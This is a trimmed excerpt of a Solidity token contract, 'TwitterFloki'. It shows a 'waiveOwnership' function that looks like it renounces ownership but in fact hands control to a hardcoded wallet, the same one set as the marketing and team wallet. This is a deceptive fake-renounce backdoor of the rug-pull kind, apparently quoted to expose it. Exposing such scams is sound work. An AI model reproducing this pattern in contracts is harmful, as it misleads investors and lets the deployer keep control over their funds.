...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x8Ca66f1B4363257783Fb3df3A9A9226452dD5424));
        _owner = address(0x8Ca66f1B4363257783Fb3df3A9A9226452dD5424);
    }
...
contract TwitterFloki is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x8Ca66f1B4363257783Fb3df3A9A9226452dD5424);
    address payable public teamWalletAddress = payable(0x8Ca66f1B4363257783Fb3df3A9A9226452dD5424);
